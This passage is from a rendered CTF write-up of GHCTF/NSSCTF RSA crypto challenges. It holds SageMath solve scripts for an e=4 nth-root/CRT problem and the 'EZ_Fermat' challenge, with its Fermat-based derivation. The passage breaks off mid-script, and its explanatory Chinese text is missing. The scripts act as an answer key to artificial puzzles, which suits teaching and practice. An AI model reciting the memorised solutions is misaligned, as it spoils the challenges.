class="number">305364532854935080710443995362714630091</span></span><br><span class="line">c= <span class="number">14745090428909283741632702934793176175157287000845660394920203837824364163635</span></span><br><span class="line">n= <span class="number">55807222544207698804941555841826949089076269327839468775219849408812970713531</span></span><br><span class="line">e = <span class="number">4</span></span><br><span class="line">ps = [p, q]</span><br><span class="line">checker = genHeaderChecker(<span class="string">&#x27;NSSCTF&#x27;</span>)</span><br><span class="line">res = nthRSA_n(c, e, ps, checker=checker)</span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> res:</span><br><span class="line">  flag = long_to_bytes(<span class="built_in">int</span>(r))</span><br><span class="line">  <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><a href="https://seandictionary.top/ghctf-2025/"></a>(<code>AMM</code>)<code>nth_root</code><code>crt</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p= <span class="number">182756071972245688517047475576147877841</span></span><br><span class="line">q= <span class="number">305364532854935080710443995362714630091</span></span><br><span class="line">c= <span class="number">14745090428909283741632702934793176175157287000845660394920203837824364163635</span></span><br><span class="line">n= <span class="number">55807222544207698804941555841826949089076269327839468775219849408812970713531</span></span><br><span class="line">e= <span class="number">4</span></span><br><span class="line"> </span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">gcd = GCD(e,phi)</span><br><span class="line"> </span><br><span class="line">res1 = Zmod(p)(c).nth_root(gcd, <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">res2 = Zmod(q)(c).nth_root(gcd, <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> res2:</span><br><span class="line">        m = crt([<span class="built_in">int</span>(i),<span class="built_in">int</span>(j)],[p,q])</span><br><span class="line">        <span class="keyword">if</span> m <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)).decode())</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><h2 id="ez_fermat"><a class="markdownIt-Anchor" href="#ez_fermat"></a> EZ_Fermat</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> f</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;NSSCTF&#123;test_flag&#125;&#x27;</span></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = ZZ[]</span><br><span class="line">f = R(<span class="built_in">str</span>(f))</span><br><span class="line"></span><br><span class="line">w = <span class="built_in">pow</span>(<span class="number">2</span>,f(p),n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;n = &#125;</span>\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;e = &#125;</span>\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c = &#125;</span>\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;f = &#125;</span>\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;w = &#125;</span>\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 101780569941880865465631942473186578520071435753163950944409148606282910806650879176280021512435190682009749926285674412651435782567149633130455645157688819845748439487113261739503325065997835517112163014056297017874761742768297646567397770742374004940360061700285170103292360590891188591132054903101398360047</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">c = 77538275949900942020886849496162539665323546686749270705418870515132296087721218282974435210763225488530925782158331269160555819622551413648073293857866671421886753377970220838141826468831099375757481041897142546760492813343115244448184595644585857978116766199800311200819967057790401213156560742779242511746</span></span><br><span class="line"><span class="string">f = 2*x^332 - x^331 + x^329 + 3*x^328 - x^327 - 3*x^325 + x^323 - 3*x^322 - x^321 - 3*x^320 + x^319 + 2*x^318 - 4*x^317 - 3*x^315 - 2*x^314 + x^313 + x^312 + 2*x^311 + 2*x^309 + 2*x^308 + 5*x^307 + 2*x^306 + 3*x^305 + 5*x^304 + 4*x^303 + x^302 - x^301 - x^300 - 2*x^299 - 2*x^298 + x^297 + 3*x^296 - x^295 - 4*x^292 - x^290 + 4*x^289 - x^287 - 3*x^286 + x^285 - 2*x^284 + x^283 - x^282 - 2*x^281 + x^280 - 2*x^279 + x^278 + 2*x^277 - 3*x^276 - x^275 - 4*x^274 - 3*x^273 - 5*x^272 - 2*x^271 - 3*x^270 + 2*x^269 + 2*x^268 - x^267 - 2*x^266 + x^265 + x^264 - 3*x^262 - 3*x^259 + 2*x^258 - x^257 + 2*x^256 + 2*x^255 - x^254 - 2*x^253 - x^252 + 2*x^251 - x^250 + x^249 + 2*x^247 + 2*x^246 + 2*x^245 - 2*x^244 - 3*x^243 + 2*x^242 - 3*x^241 - x^240 - 3*x^239 - x^236 - 3*x^235 - 2*x^234 - x^233 - 2*x^232 - x^231 - 3*x^230 - 2*x^229 - 4*x^228 - 2*x^227 - 3*x^226 + 2*x^225 + x^224 - x^223 - 2*x^221 + 3*x^219 - x^217 - 2*x^216 + x^215 + 2*x^213 - x^212 + 3*x^211 + x^210 + 4*x^209 + x^208 - x^206 - x^205 - x^204 + 2*x^203 - 3*x^202 + 2*x^199 - x^198 + 2*x^196 - 2*x^195 + 3*x^194 + 3*x^193 - x^192 + 4*x^191 + 2*x^189 + x^186 - x^185 - x^184 + 3*x^183 + x^182 + 2*x^181 - 2*x^180 + x^177 + x^175 - x^173 + 3*x^172 + x^170 + x^169 - x^167 - 2*x^166 - x^165 - 4*x^164 - 2*x^163 + 2*x^162 + 4*x^161 - 2*x^160 - 3*x^159 - 2*x^158 - 2*x^157 + x^156 - x^155 + 3*x^154 - 4*x^153 + x^151 + 2*x^150 + x^149 - x^148 + 2*x^147 + 3*x^146 + 2*x^145 - 4*x^144 - 4*x^143 + x^142 - 2*x^140 - 2*x^139 + 2*x^138 + 3*x^137 + 3*x^136 + 3*x^135 + x^134 - x^133 + 2*x^132 + 3*x^130 - 3*x^129 - 2*x^128 - x^127 - 2*x^126 + x^125 + x^124 - 2*x^123 + x^122 - x^121 + 3*x^120 - x^119 - 2*x^118 - x^117 - x^116 - 2*x^115 + 2*x^114 + 2*x^113 - 3*x^112 - x^111 - 4*x^110 + x^109 + x^108 + x^106 - 4*x^105 + x^104 - x^103 - x^101 + x^100 - 2*x^99 + x^98 - x^97 + 3*x^96 + 3*x^94 - x^93 - x^92 + x^91 - 2*x^90 + x^89 - x^88 + x^87 - x^86 + x^85 + x^84 - x^83 + x^79 - 3*x^78 - 2*x^77 + x^74 + 3*x^73 - x^72 - 3*x^71 - 2*x^70 + x^69 - 3*x^66 + x^65 + x^64 - 4*x^62 - x^61 + x^60 - x^59 + 3*x^58 - x^57 - x^54 + 3*x^53 + x^51 - 3*x^50 - x^49 + 2*x^47 - x^46 - x^44 + x^43 - x^42 - 4*x^41 - 3*x^39 - x^37 - x^36 - 3*x^35 + x^34 + x^33 - 2*x^32 + 2*x^31 - x^30 + 2*x^29 - 2*x^28 - 2*x^27 - x^24 + x^22 - 5*x^21 + 3*x^20 + 2*x^19 - x^18 + 2*x^17 + x^16 - 2*x^15 - 2*x^14 + x^13 + x^12 + 2*x^11 - 3*x^10 + 3*x^9 + 2*x^8 - 4*x^6 - 2*x^5 - 4*x^4 + x^3 - x^2 - 1</span></span><br><span class="line"><span class="string">w = 32824596080441735190523997982799829197530203904568086251690542244969244071312854874746142497647579310192994177896837383837384405062036521829088599595750902976191010000575697075792720479387771945760107268598283406893094243282498381006464103080551366587157561686900620059394693185990788592220509670478190685244</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext><msup><mn>2</mn><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>n</mi><mo stretchy="false">)</mo><mo></mo><msup><mn>2</mn><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mtext></mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mo stretchy="false">(</mo><mi>p</mi><mo></mo><mn>1</mn><mo stretchy="false">)</mo></mrow></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>p</mi><mo stretchy="false">)</mo><mtext></mtext><mi>s</mi><mi>a</mi><mi>g</mi><mi>e</mi><mtext></mtext></mrow><annotation encoding="application/x-tex">2^{f(p)}(mod\ n)\equiv 2^{f(p)\ mod\ (p-1)}(mod\ p)sage</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.138em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8879999999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">p</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.138em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8879999999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">p</span><span class="mclose mtight">)</span><span class="mspace mtight"><span class="mtight"></span></span><span class="mord mathnormal mtight">m</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">d</span><span class="mspace mtight"><span class="mtight"></span></span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">p</span><span class="mbin mtight"></span><span class="mord mtight">1</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext><mi>f</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mo>=</mo><mi>f</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo><mo>=</mo><mo></mo><mn>57</mn><mtext></mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>p</mi><mo></mo><mn>1</mn></mrow><annotation encoding="application/x-tex">f(p)=f(1)=-57\ mod\ p-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"></span><span class="mord">5</span><span class="mord">7</span><span class="mspace"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext></mrow><annotation encoding="application/x-tex"></annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mi>a</mi><mi>n</mi></msub><mo></mo><msup><mi>x</mi><mi>n</mi></msup><mo>+</mo><msub><mi>a</mi><mrow><mi>n</mi><mo></mo><mn>1</mn></mrow></msub><mo></mo><msup><mi>x</mi><mrow><mi>n</mi><mo></mo><mn>1</mn></mrow></msup><mo>+</mo><msub><mi>a</mi><mrow><mi>n</mi><mo></mo><mn>2</mn></mrow></msub><mo></mo><msup><mi>x</mi><mrow><mi>n</mi><mo></mo><mn>2</mn></mrow></msup><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><msub><mi>a</mi><mn>0</mn></msub><mo></mo><msup><mi>x</mi><mn>0</mn></msup></mrow><annotation encoding="application/x-tex">f(x)=a_{n}*x^{n}+a_{n-1}*x^{n-1}+a_{n-2}*x^{n-2}+...+a_{0}*x^{0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.747722em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.673611em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight"></span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight"></span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.673611em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight"></span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight"></span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span></span></span></span></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mtext></mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>p</mi><mo></mo><mn>1</mn><mo>=</mo><msub><mi>a</mi><mi>n</mi></msub><mo>+</mo><msub><mi>a</mi><mrow><mi>n</mi><mo></mo><mn>1</mn></mrow></msub><mo>+</mo><msub><mi>a</mi><mrow><mi>n</mi><mo></mo><mn>2</mn></mrow></msub><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><msub><mi>a</mi><mn>0</mn></msub><mo>=</mo><mi>f</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo><mtext></mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>p</mi><mo></mo><mn>1</mn></mrow><annotation encoding="application/x-tex">f(p)\ mod\ p-1=a_{n}+a_{n-1}+a_{n-2}+...+a_{0}=f(1)\ mod\ p-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mspace"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.791661em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight"></span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.791661em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight"></span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span><span class="mspace"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></p><p><a href="https://seandictionary.top/ghctf-2025/"></a><strong>y</strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">101780569941880865465631942473186578520071435753163950944409148606282910806650879176280021512435190682009749926285674412651435782567149633130455645157688819845748439487113261739503325065997835517112163014056297017874761742768297646567397770742374004940360061700285170103292360590891188591132054903101398360047</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">77538275949900942020886849496162539665323546686749270705418870515132296087721218282974435210763225488530925782158331269160555819622551413648073293857866671421886753377970220838141826468831099375757481041897142546760492813343115244448184595644585857978116766199800311200819967057790401213156560742779242511746</span></span><br><span class="line">w = <span class="number">32824596080441735190523997982799829197530203904568086251690542244969244071312854874746142497647579310192994177896837383837384405062036521829088599595750902976191010000575697075792720479387771945760107268598283406893094243282498381006464103080551366587157561686900620059394693185990788592220509670478190685244</span></span><br><span class="line">R.&lt;x&gt; = ZZ[]</span><br><span class="line">f = <span class="number">2</span>*x^<span class="number">332</span> - x^<span class="number">331</span> + x^<span class="number">329</span> + <span class="number">3</span>*x^<span class="number">328</span> - x^<span class="number">327</span> - <span class="number">3</span>*x^<span class="number">325</span> + x^<span class="number">323</span> - <span class="number">3</span>*x^<span class="number">322</span> - x^<span class="number">321</span> - <span class="number">3</span>*x^<span class="number">320</span> + x^<span class="number">319</span> + <span class="number">2</span>*x^<span class="number">318</span> - <span class="number">4</span>*x^<span class="number">317</span> - <span class="number">3</span>*x^<span class="number">315</span> - <span class="number">2</span>*x^<span class="number">314</span> + x^<span class="number">313</span> + x^<span class="number">312</span> + <span class="number">2</span>*x^<span class="number">311</span> + <span class="number">2</span>*x^<span class="number">309</span> + <span class="number">2</span>*x^<span class="number">308</span> + <span class="number">5</span>*x^<span class="number">307</span> + <span 